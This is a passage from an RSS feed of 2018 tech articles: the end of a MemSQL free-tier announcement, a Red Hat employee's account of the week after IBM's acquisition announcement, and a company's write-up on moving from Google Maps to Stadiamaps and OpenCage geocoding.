&lt;p&gt;With the MemSQL free tier, you can configure up to 128GB of RAM capacity, it will not allow provisioning a cluster larger than this configuration. Users who need more compute for their application can &lt;a href=&quot;https://www.memsql.com/contact&quot;&gt;contact us&lt;/a&gt; for an evaluation or subscription for an Enterprise license.&lt;/p&gt;
&lt;p&gt;Updating to an Enterprise subscription is as simple as changing your license key. This can be done while online and requires no export/import or cumbersome upgrade steps.&lt;/p&gt;
&lt;p&gt;Try MemSQL for your applications and analytical systems today. You can &lt;a href=&quot;https://www.memsql.com/download/&quot;&gt;install MemSQL 6.7 for free&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;For more information on MemSQL 6.7, see the &lt;a href=&quot;http://www.memsql.com/releases/memsql67/&quot;&gt;press release&lt;/a&gt; and all eight blog posts on the new version: &lt;a href=&quot;https://www.memsql.com/blog/memsql67/&quot;&gt;Product launch&lt;/a&gt;; &lt;a href=&quot;https://www.memsql.com/blog/new-toolset-for-managing-monitoring-memsql/&quot;&gt;managing and monitoring MemSQL 6.7&lt;/a&gt; (includes MemSQL Studio); the new &lt;a href=&quot;https://www.memsql.com/blog/announcing-memsql-free-tier/&quot;&gt;free tier&lt;/a&gt; (this post); &lt;a href=&quot;https://www.memsql.com/blog/performance-for-memsql-67/&quot;&gt;performance improvements&lt;/a&gt;; the &lt;a href=&quot;https://www.memsql.com/blog/areeba-case-study/&quot;&gt;Areeba case study&lt;/a&gt;; the &lt;a href=&quot;https://www.memsql.com/blog/wag-labs-case-study/&quot;&gt;Wag! case study&lt;/a&gt;; the creation of the &lt;a href=&quot;https://www.memsql.com/blog/creating-visual-explain/&quot;&gt;Visual Explain feature&lt;/a&gt;; and how we developed &lt;a href=&quot;https://www.memsql.com/blog/adaptive-compression-in-memsql/&quot;&gt;adaptive compression&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 06 Nov 2018 15:32:03 +0000</pubDate>
<dc:creator>bsg75</dc:creator>
<og:type>article</og:type>
<og:title>MemSQL: Now Free to Use - MemSQL Blog</og:title>
<og:description>Today, we announced our latest product version, MemSQL 6.7. With this release, MemSQL is now free for everyone to use for databases with up to 128GB of RAM usage. Unlike what customers get from other database providers, the free tier of MemSQL is full featured and includes all enterprise capabilities, including high availability and security. What Can You Do with the Free Tier? You can do almost anything with MemSQL, using the free tier, that you can do if you have an Enterprise license, including capabilities and production use. The differences are that you can only configure the free tier …</og:description>
<og:url>https://www.memsql.com/blog/announcing-memsql-free-tier/</og:url>
<og:image>https://www.memsql.com/blog/wp-content/uploads/2018/11/3_free-1.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.memsql.com/blog/announcing-memsql-free-tier/</dc:identifier>
</item>
<item>
<title>At least it wasn&amp;#039;t Oracle</title>
<link>https://chrisshort.net/one-fish-two-fish-blue-fish-sporting-new-red-hat/</link>
<guid isPermaLink="true" >https://chrisshort.net/one-fish-two-fish-blue-fish-sporting-new-red-hat/</guid>
<description>&lt;p&gt;Since Sunday afternoon, I’ve been in a whirlwind of meetings, discussions, and calls about IBM’s plan to acquire Red Hat for $34 billion. My mind has been racing but, after some consideration, I’ve decided to share my thoughts as a narrative timeline. Trust me when say that I have given this format considerable thought. It is likely the safest way (regulatory-wise) to deliver my thoughts on the topic.&lt;/p&gt;&lt;p&gt;I would like to point out that I have updated &lt;a href=&quot;https://chrisshort.net/terms/&quot;&gt;my &lt;strong&gt;disclaimer&lt;/strong&gt; and this site’s terms&lt;/a&gt;. My views do not reflect those of my employer or entities I’m affiliated with. Names are withheld for obvious reasons.&lt;/p&gt;
&lt;h2 id=&quot;at-least-it-wasn-t-oracle&quot;&gt;“At least it wasn’t Oracle”&lt;/h2&gt;
&lt;p&gt;On Sunday, October 29, 2018, I was watching my two older nephews play with Max at my youngest nephew’s baptism party when a Bloomberg alert popped up. My phone was on a coffee table, while I could make out that the alert was Bloomberg I couldn’t read what it said. “Bloomberg? On a Sunday? Huh.” I thought to myself. Picking up the phone I immediately notice it says something about Red Hat. I see the headline, &lt;a href=&quot;https://www.bloomberg.com/news/articles/2018-10-28/ibm-is-said-to-near-deal-to-acquire-software-maker-red-hat&quot;&gt;IBM to Acquire Linux Distributor Red Hat for $33.4 Billion&lt;/a&gt;.&lt;/p&gt;
&lt;ins class=&quot;adsbygoogle&quot; data-ad-layout=&quot;in-article&quot; data-ad-format=&quot;fluid&quot; data-ad-client=&quot;ca-pub-8972983586873269&quot; data-ad-slot=&quot;4663018952&quot;/&gt; &lt;p&gt;I opened the story, skimmed it, and got up to go find my wife, Julie. I show her the story. Julie knows IBM from living in Raleigh for a decade (not a good decade for IBM either). I don’t recall exactly what she said or did but, it made me start looking for more information. While opening Inoreader an alert from Reuters came in, &lt;a href=&quot;https://www.reuters.com/article/us-red-hat-m-a-ibm/ibm-nears-deal-to-acquire-cyber-security-company-red-hat-sources-idUSKCN1N20N3&quot;&gt;IBM nears deal to acquire cyber security company Red Hat: sources&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I opened Gmail so I could see what Red Hat’s stream of consciousness (aka memo-list) is saying; it was calm (only four e-mails, some wondering if it’s a hoax). Then Business Insider broke their story, &lt;a href=&quot;https://www.businessinsider.com/ibm-is-reportedly-nearing-a-deal-to-acquire-redhat-the-software-company-valued-at-20-billion-2018-10&quot;&gt;IT’S OFFICIAL: IBM is acquiring software company Red Hat for $34 billion&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It was an odd feeling. Like, maybe I could have said something knowing it wouldn’t have mattered. It was a sensation of not even getting a chance to do something. In the span of 24 minutes, I went from having a pretty great day to having what was akin to a panic attack.&lt;/p&gt;

&lt;p&gt;“I have to get home,” I thought to myself. I made a hasty goodbye to the family and walk out the door. I sent the &lt;a href=&quot;https://newsroom.ibm.com/2018-10-28-IBM-To-Acquire-Red-Hat-Completely-Changing-The-Cloud-Landscape-And-Becoming-Worlds-1-Hybrid-Cloud-Provider&quot;&gt;IBM press release&lt;/a&gt; to my boss to make sure she knew. I didn’t know why I was driving home but, home was also the office and it felt like the right thing to do. If push came to shove I could get people up to speed as they popped up online.&lt;/p&gt;
&lt;p&gt;The drive home was filled with nausea and worry. “I should get home and go straight down to the office and login,” I think to myself. My boss texts back, “Holy Shit!” I get home to a lot of notifications. My boss and I go back and forth for a minute vis text as I’m walking inside. But, there wasn’t much to be done. I took some anxiety meds and laid face down for a little bit on my bed.&lt;/p&gt;
&lt;ins class=&quot;adsbygoogle&quot; data-ad-layout=&quot;in-article&quot; data-ad-format=&quot;fluid&quot; data-ad-client=&quot;ca-pub-8972983586873269&quot; data-ad-slot=&quot;4663018952&quot;/&gt; &lt;p&gt;A friend at Red Hat texts me asking if I’d seen the news. I responded back that I had and wasn’t feeling too great about it. You have to understand my experience with IBM. In 2015, I worked for a few weeks at a healthcare company that was a $1 billion dollar IBM acquisition. It was a total dumpster fire and IBM knew it. But, Watson Health was the future of IBM, a friend elsewhere in IBM had told me. Long story short, I saw a ton of cracks in the business that was bought for a ridiculous sum of money. I had to make a decision real quick and got out of Dodge. Earlier this year, &lt;a href=&quot;https://www.theregister.co.uk/2018/05/25/ibms_watson_layoffs/&quot;&gt;IBM’s Watson Health had huge layoffs&lt;/a&gt; and I felt very justified in my decision. My rash decision making might have hurt my career a little. But, I dodged a huge bullet in my first run in as an almost IBM employee. At the end of the brief discussion with my friend, he said, “&lt;strong&gt;At least it wasn’t Oracle.&lt;/strong&gt;” My response, “Yes… I really would have driven off the road then.”&lt;/p&gt;
&lt;h2 id=&quot;monday-morning-quarterbacking&quot;&gt;Monday Morning Quarterbacking&lt;/h2&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;“In 2018, dreams don’t die slowly and fade away into nothing. They’re nuked from orbit.” —Chris Short to a friend&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://twitter.com/cra/status/1056671662073171970&quot;&gt;memo-list was a dumpster fire&lt;/a&gt;. I stopped looking at it altogether overnight. Monday morning brought a slew of meeting and all-hands calendar invites. A friend who went through a gnarly acquisition at NetApp calls. But, his Monday morning quarterbacking was pretty accurate. He gives some sage advice that calms my nerves but doesn’t completely put me at ease. It was a start to calming down so I’m incredibly thankful for that.&lt;/p&gt;
&lt;p&gt;The Jim Whitehurst-Ginni Rometty all-hands was critically important for both Jim and Ginni to nail in front of the world. Their &lt;a href=&quot;https://www.cnbc.com/video/2018/10/29/watch-the-full-interview-with-ibm-and-red-hat-ceos-on-33-billion-deal.html&quot;&gt;CNBC Squawk Box spot&lt;/a&gt; was decent but who knew how an auditorium full of Red Hatters would respond.&lt;/p&gt;
&lt;p&gt;Jim walks out in his familiar jeans and crisp, white button down. Ginni walks out in purple. Turns out that later on in the presentation Arvind Krishna, IBM’s SVP of Hybrid Cloud and Director of Research, said he was wearing purple to show cohesion because red and blue make purple. Ginni said she didn’t even realize she had done it (but was sure to point it out on &lt;a href=&quot;https://www.cnbc.com/2018/10/29/ibm-ceo-red-hat-is-a-game-changer-makes-us-no-1-in-hybrid-cloud.html&quot;&gt;CNBC’s Mad Money&lt;/a&gt; that night). It was a very human moment.&lt;/p&gt;
&lt;ins class=&quot;adsbygoogle&quot; data-ad-layout=&quot;in-article&quot; data-ad-format=&quot;fluid&quot; data-ad-client=&quot;ca-pub-8972983586873269&quot; data-ad-slot=&quot;4663018952&quot;/&gt; &lt;p&gt;The all-hands itself was good. Ginni donning a red fedora was a very nice touch. Also, whichever Red Hatter wrote “fuck you” to Jim in the chat during the global all-hands, I’m beyond disappointed in you. I pretty much had to close Twitter and avoid memo-list after the event. There was a lot of data and opinion to sort out. A snarky text comes in from a friend afterward, “Never thought I’d see the day Chris Short worked for IBM.” I muted notifications for a while too.&lt;/p&gt;
&lt;p&gt;My next all-hands was with my business unit leadership. They were very open, honest, and a smidge too excited. Long-time Red Hatters probably have a lot of stock that’s going to vest at a nice premium (even after the acquisition news triggered a 50+ point bump). For those of us still reeling from the news itself and what the future may hold I decided to write an e-mail the BU’s leadership.&lt;/p&gt;
&lt;blockquote readability=&quot;46.268774703557&quot;&gt;
&lt;p&gt;Thank you for taking the time today to talk and answer our questions. I asked flat out what my number one concern was for Red Hat and that is its people. I know that there is a large chunk of Red Hat, myself included, getting e-mails, phone calls, DMs, etc. this morning. Some of these are congratulatory, more are condolences, and others are flat out, “Are you going to be okay?”&lt;/p&gt;
&lt;p&gt;The metrics alone show this is a monumental event that could be life-changing. I’m already feeling myself become less open as a result. Contra to Red Hat policies, I am self censoring more so than I have through other acquisitions because this is IBM. I’m sharing press and stories but, I’m not commenting, at all, where normally I would. I have thoughts and opinions on the topic and I’m hesitant to discuss them as I don’t know what IBM’s reaction will be.&lt;/p&gt;
&lt;p&gt;Please keep in mind, IBM has been building, for a decade or more, negative thoughts in peoples minds. Their own actions have affected friends and family negatively. I know companies exist to deliver value to investors. But, we live in a very different world. Red Hat was this shining beacon of hope for people. Peoples’ hopes and dreams are on uncertain footing now.&lt;/p&gt;
&lt;p&gt;Some of us now have this fear of an IBM blue washing of Red Hat. Google has shown for years that, psychological safety is important to effective teams (&lt;a href=&quot;https://rework.withgoogle.com/blog/five-keys-to-a-successful-google-team/&quot;&gt;https://rework.withgoogle.com/blog/five-keys-to-a-successful-google-team/&lt;/a&gt;). Being as psychologically safe at a company as I am at Red Hat has never happened to me before. It has been liberating. I don’t feel safe being as open as I was last week and this is the first twelve hours. Please help folks try to feel safe through this acquisition.&lt;/p&gt;
&lt;p&gt;Last week, I told a friend I finally found a place to call home in Red Hat. That friend is now trying to recruit me away from Red Hat. As I’m sure you’re painfully aware, the industry moves way faster than this acquisition ever will. Please keep that in mind&lt;/p&gt;
&lt;p&gt;Thank you for your time and leadership.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This e-mail captures the reality of Monday. Yes, my natural instinct to self-censor was working overtime. That was likely more legalities, fear, and doubt fueling that anxiety. It was an emotional and raw morning. A lot of folks around Red Hat were fielding calls on Sunday evening to jump ship. I know what it’s like when people are trying to lure you away. It’s easy to be lured away from uncertainty (we are humans after all).&lt;/p&gt;
&lt;p&gt;The day was pretty much derailed at that point. There wasn’t much me or many others could do but respond to calls from folks, deflect recruiters, and side-eye the bejesus out of memo-list.&lt;/p&gt;
&lt;h2 id=&quot;reaching-across-divides&quot;&gt;Reaching Across Divides&lt;/h2&gt;
&lt;p&gt;I had taken the mind overnight that the messaging seems to indicate that nothing earth-shattering was going to change for a while. Tuesday started off answering some DMs, texts, and e-mails. I mention this because of the time it takes to proofread every response. My modus operandi is open. Suddenly a restriction is put in place and it made me hyper-aware of what I was writing. It might have been unnecessary but, some messages were prying and others weren’t. Never too careful.&lt;/p&gt;
&lt;ins class=&quot;adsbygoogle&quot; data-ad-layout=&quot;in-article&quot; data-ad-format=&quot;fluid&quot; data-ad-client=&quot;ca-pub-8972983586873269&quot; data-ad-slot=&quot;4663018952&quot;/&gt; &lt;p&gt;During a Marketing all-hands things seemed to quiet down a little. Then a funny thing started happening. IBMers started reaching out. They shared what their life at IBM was like. So I started reaching out to some IBMers I know. We all started talking. I spoke with one IBMer working from their home office in Virginia. One person spoke of a co-worker getting ordained to officiate a wedding of another IBMer. There were no folks reaching out from IBM saying, “Psst. Hey, man. RUN FOR YOUR LIFE! GO GET HELP!”&lt;/p&gt;
&lt;p&gt;This spurred me to reach further out to see what other folks thought. I was reading journalist and analyst opinions but, I wasn’t reaching out to other tech folks to see what they would do or what they thought. One Googler remarked it wasn’t a great time to be at any big tech company. &lt;a href=&quot;https://blogs.microsoft.com/on-the-issues/2018/10/26/technology-and-the-us-military/&quot;&gt;Microsoft is playing JEDI&lt;/a&gt;, &lt;a href=&quot;https://www.nytimes.com/2018/11/01/technology/google-walkout-sexual-harassment.html&quot;&gt;Google is getting walked out on&lt;/a&gt;, &lt;a href=&quot;https://www.cbsnews.com/news/facebook-is-caught-in-an-ever-tightening-squeeze/&quot;&gt;Facebook ruined democracy somehow&lt;/a&gt;, &lt;a href=&quot;https://www.nytimes.com/2018/10/23/business/economy/amazon-workers-sears-bankruptcy-filing.html&quot;&gt;Amazon doesn’t treat its workers well&lt;/a&gt;… The list went on and on. If you’re not in turmoil and you’re at a tech company consider yourself lucky. Of all the situations the IBM/Red Hat situation was the best one to be in.&lt;/p&gt;
&lt;h2 id=&quot;wednesday-war-planning&quot;&gt;Wednesday War Planning&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;“No battle plan survives first contact with the enemy.” —Helmuth von Moltke the Elder&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;By the time Wednesday rolled around my anxiety was gone. The plan was to sit tight, ride things through the acquisition, and try to turn IBM into the next Microsoft. On Sunday, when I announced to the family my company was being bought by IBM the looks on folks faces were different based on generation. The older the person, the happier they looked. I know my grandfather would be so happy to hear this news too. I think IBM wants to truly turn things around and fast. &lt;a href=&quot;https://chrisshort.net/microsoft-has-come-a-long-way/&quot;&gt;Microsoft Has Come a Long Way&lt;/a&gt; after all in becoming a place people want to work.&lt;/p&gt;
&lt;ins class=&quot;adsbygoogle&quot; data-ad-layout=&quot;in-article&quot; data-ad-format=&quot;fluid&quot; data-ad-client=&quot;ca-pub-8972983586873269&quot; data-ad-slot=&quot;4663018952&quot;/&gt; &lt;p&gt;But, I need a way to figure out if there are canaries in the proverbial coal mine that will indicate to me it’s time to dust off the ole &lt;a href=&quot;https://chrisshort.net/resume/&quot;&gt;resume&lt;/a&gt;. Here are some scenarios that would be a red flag for me:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Jim Whitehurst or Paul Cormier moving to anywhere but the IBM C-suite within twelve months of the acquisition closing&lt;/li&gt;
&lt;li&gt;A re-org of Red Hat within twelve months of the acquisition closing&lt;/li&gt;
&lt;li&gt;If IBM’s Open Source Participation Guidelines are not conducive to Red Hat’s way of business (especially if it somehow gets in my way somehow)&lt;/li&gt;
&lt;li&gt;A handful of people (whom I will not name) leave between six months prior to or up to six months after the acquisition closing&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;I also need to start figuring out what I want to be doing, day to day, in two years (y’all… I’ve been winging it since 2011). Indeed, I needed to figure out what I wanted to accomplish in 2019. This makes that exercise a little more urgent. It also needs to include a potential job move in early 2020. I hope it doesn’t. I hope this is as good as it can be for IBM and Red Hat in their entireties.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In the short term (six to eighteen months), I’m likely not going anywhere. There are always two or three companies that, if came calling, I’d probably leave Red Hat before that. Red Hat is awesome and is still my dream company to work for. IBM has some incredibly smart people in the company like Red Hat does. It makes sense to stick around and work with a few of them if IBM does what they say they’re going to do.&lt;/p&gt;
&lt;p&gt;A huge thanks to all the wonderful people I’ve talked to this week. You’ve made a jarring change easier for me to manage mentally. I am forever grateful.&lt;/p&gt;
&lt;p&gt;Make no mistake, this is a historic moment. Whether it’s the beginning or the end of a history is the big question.&lt;/p&gt;
&lt;blockquote readability=&quot;4.9166666666667&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://chrisshort.net/newsletter/&quot;&gt;&lt;strong&gt;Subscribe to DevOps’ish&lt;/strong&gt;&lt;/a&gt; for updates on DevOps, Cloud Native, and Open Source news.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Tue, 06 Nov 2018 14:13:34 +0000</pubDate>
<dc:creator>koolherc</dc:creator>
<og:title>One Fish, Two Fish, Blue Fish Sporting New Red Hat</og:title>
<og:description>What it was like for relatively new Red Hat employee, Chris Short, during the IBM acquisition announcement and the week that followed.</og:description>
<og:image>https://chrisshort.net/one-fish-two-fish-blue-fish-sporting-new-red-hat/ibm-to-acquire-red-hat.png</og:image>
<og:url>https://chrisshort.net/one-fish-two-fish-blue-fish-sporting-new-red-hat/</og:url>
<og:type>website</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://chrisshort.net/one-fish-two-fish-blue-fish-sporting-new-red-hat/</dc:identifier>
</item>
<item>
<title>Migrating away from Google Maps and cutting costs</title>
<link>https://www.eventsofa.de/campus/migrating-away-from-google-maps-and-cutting-costs-by-99/</link>
<guid isPermaLink="true" >https://www.eventsofa.de/campus/migrating-away-from-google-maps-and-cutting-costs-by-99/</guid>
<description>&lt;p&gt;&lt;em&gt;Thanks for the discussion on &lt;a href=&quot;https://news.ycombinator.com/item?id=18390425#18390675&quot;&gt;HN&lt;/a&gt; and all the feedback. As pointed out by 255kb, there is a different pricing for place mode to put markers on addresses and places. Our customers often change the marker position though, as it doesn’t reflect their understanding of their venue. If you only place a marker on an address, the Google price hike doesn’t affect you probably.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;eventsofa is a location platform where you can find locations for your events, for example for &lt;a href=&quot;https://www.eventsofa.de/weihnachtsfeier-ideen-berlin&quot;&gt;Christmas parties&lt;/a&gt;. We’ve been using Google Maps on profile pages for some years now and have been happy with the experience. Usage was free for us, reliability was high and there was a steady stream of new features and map enhancements. Beside Maps we were also using geo coding from Google, which was a much rougher experience from Google with mixed language and bad data.&lt;/p&gt;
&lt;p&gt;Then came the shock, Google wanted money for Google Maps usage. From a business point of view, we surely can understand Google wanting money for its services. We did budget away money as we were expecting this to come. But what shocked us was the increase in prices by more than 1000%. They wanted to sweeten the price hike with a monthly credit, but this was a raindrop in the ocean. The projected costs from Google were several thousands of euros per month, with an upward trend indicated by Google and also our seasonal business. .&lt;/p&gt;
&lt;p&gt;We waited two months to see real prices on our invoice as we hoped to stay with Google. First thought for staying was cutting costs and migrating to static Google maps. But this looked more complicated than migrating our Javascript to a new Mapbox API. So during this time we looked around for some alternatives. There are many offerings from Here Maps, Azure Maps, Apple Maps, TomTom and many more. After looking at some data we decided to base our usage on an &lt;a href=&quot;https://www.openstreetmap.org/&quot;&gt;OpenStreetMap&lt;/a&gt; based service. OpenStreetMap is a great service and at least in Europe the quality of data is very high. When hiking or walking I usually use something based on OSM with its higher quality of small pathways and parks compared to Google Maps. We believe OSM is the future of mapping and wanted to support it.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://i2.wp.com/www.eventsofa.de/campus/wp-content/uploads/2018/10/MapExample.png?ssl=1&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-13577&quot; src=&quot;https://i2.wp.com/www.eventsofa.de/campus/wp-content/uploads/2018/10/MapExample.png?resize=696%2C423&amp;amp;ssl=1&quot; alt=&quot;&quot; width=&quot;696&quot; height=&quot;423&quot; data-recalc-dims=&quot;1&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We soon narrowed down our search to &lt;a href=&quot;https://stadiamaps.com&quot;&gt;Stadiamaps&lt;/a&gt;. They have excellent pricing, good looking tiles, support the &lt;a href=&quot;https://www.mapbox.com/api-documentation/&quot;&gt;Mapbox API&lt;/a&gt; and as we learned have excellent support.&lt;/p&gt;
&lt;p&gt;Migration was very easy and took much shorter than we’ve expected. We decided to use the Mapbox API with &lt;a href=&quot;https://docs.stadiamaps.com/themes/&quot;&gt;tiles from Stadiamaps&lt;/a&gt;. In under 30 minutes we migrated our code to Stadiamaps without prior knowledge of their API, including deployment. We saw an example to change the map marker and used it to create a pink marker, which we haven’t done with Google Maps.&lt;/p&gt;
&lt;p&gt;Migration led to a reduction of costs of something around 95-99% depending on seasonal traffic. Although we have to pay now for map services, the cost isn’t very high and very sustainable for us. We wish Google would have taken money from the beginning with a reasonable price we could budget instead of being free and then charging lots of money. StadiaMaps also energized us to put maps in several places we haven’t used maps before!&lt;/p&gt;
&lt;p&gt;Things have not gone as well with geo coding. Google geo coding data is only allowed to be used with Google Maps, so when you change maps you need to migrate geo coding too and recode old data. We tested several geo coding services and are comparing results to Google geocoding to see how they perform. After some changes we now use Open Cage Data geocoding. Open Cage supports both JSON and XML formats and support forward and reverse geo coding. &lt;a href=&quot;https://opencagedata.com/tutorials/migrate-from-googlemaps&quot;&gt;One benefit is we now own the coding data&lt;/a&gt; and can use it in the future even if we change the maps service or geo coding provider.&lt;/p&gt;
&lt;p&gt;Open Cage has better results than Google and supply more useful data with each response. You can get telephone code, currency, emoji flag of the country, coordinates in different formats, sun rise and sun set, time zone and many more. Results of city names and suburbs for different languages is also much better than with Google. We had some minor data issues and Open Cage Data support was excellent with very fast fixes.&lt;/p&gt;
&lt;p&gt;We were using placeId in Google geocoding to show users a list of coding results, let the user select one and then use the selection to geocode a location. As most geo coding service we’ve looked at didn’t support unique IDs for geo coding results, we had to rewrite backend and frontend code. Which isn’t as nice, but works.&lt;/p&gt;
&lt;p&gt;Support from StadiaMaps during our decision and following the migration was excellent. We’ve exchanged some emails with Stadiamaps CEO who was very kind and helpful, overall the support experience was a pleasure.&lt;/p&gt;
&lt;p&gt;Thanks to Google for giving us free Maps for some years, we’re now very happy with Stadiamaps and should have migrated before!&lt;/p&gt;
</description>
<pubDate>Tue, 06 Nov 2018 12:37:49 +0000</pubDate>
<dc:creator>ashitlerferad</dc:creator>
<og:image>https://i0.wp.com/www.eventsofa.de/campus/wp-content/uploads/2018/09/CodeScreenshot.jpg?fit=1332%2C1000&amp;ssl=1</og:image>
<og:type>article</og:type>
<og:title>Migrating away from Google Maps and cutting costs by 99% - eventsofa Campus</og:title>
<og:description>Lizenzen: Wir verwenden für Bilder soweit angegeben Creative Commons Lizenzen ( Links zu den Linzenzen finden sie aus technischen Gründen hier CC BY SA, CC BY ND, CC BY )Thanks for the discussion on HN and all the feedback. As pointed out by 255kb, there is a different pricing for place mode to put markers …</og:description>
<og:url>https://www.eventsofa.de/campus/migrating-away-from-google-maps-and-cutting-costs-by-99/</og:url>
<dc:language>de-DE</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.eventsofa.de/campus/migrating-away-from-google-maps-and-cutting-costs-by-99/</dc:identifier>
</item>
</channel>
</rss>